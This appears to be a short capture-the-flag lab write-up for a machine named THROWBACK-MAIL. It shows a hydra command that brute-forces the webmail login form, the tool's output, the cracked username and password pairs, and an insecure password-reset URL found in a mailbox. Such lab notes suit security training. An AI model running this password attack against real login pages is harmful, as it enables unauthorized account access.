# THROWBACK-MAIL

## 10.200.24.232 - THROWBACK-MAIL

```
tbhguest:WelcomeTBH1!
```


Using hydra, we found these credentials:

```
hydra -I -L usernames.txt -P passwords.txt 10.200.24.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v
```


```
[80][http-post-form] host: 10.200.24.232   login: PeanutbutterM   password: Summer2020
[STATUS] 62.00 tries/min, 186 tries in 00:03h, 113 to do in 00:02h, 16 active
[VERBOSE] Page redirected to http://10.200.24.232/src/webmail.php
[80][http-post-form] host: 10.200.24.232   login: DaviesJ   password: Management2018
[VERBOSE] Page redirected to http://10.200.24.232/src/webmail.php
[80][http-post-form] host: 10.200.24.232   login: GongoH   password: Summer2020
[STATUS] 62.00 tries/min, 248 tries in 00:04h, 51 to do in 00:01h, 16 active
[VERBOSE] Page redirected to http://10.200.24.232/src/webmail.php
[80][http-post-form] host: 10.200.24.232   login: MurphyF   password: Summer2020
[VERBOSE] Page redirected to http://10.200.24.232/src/webmail.php
[80][http-post-form] host: 10.200.24.232   login: JeffersD   password: Summer2020
```

```
PeanutbutterM:Summer2020
DaviesJ:Management2018
GongoH:Summer2020
MurphyF:Summer2020
JeffersD:Summer2020
```

-------------------

Logging in with `DaviesJ`, we found a `shell.exe` file.

Logging in `MurphyF`, we found:

```
http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD
```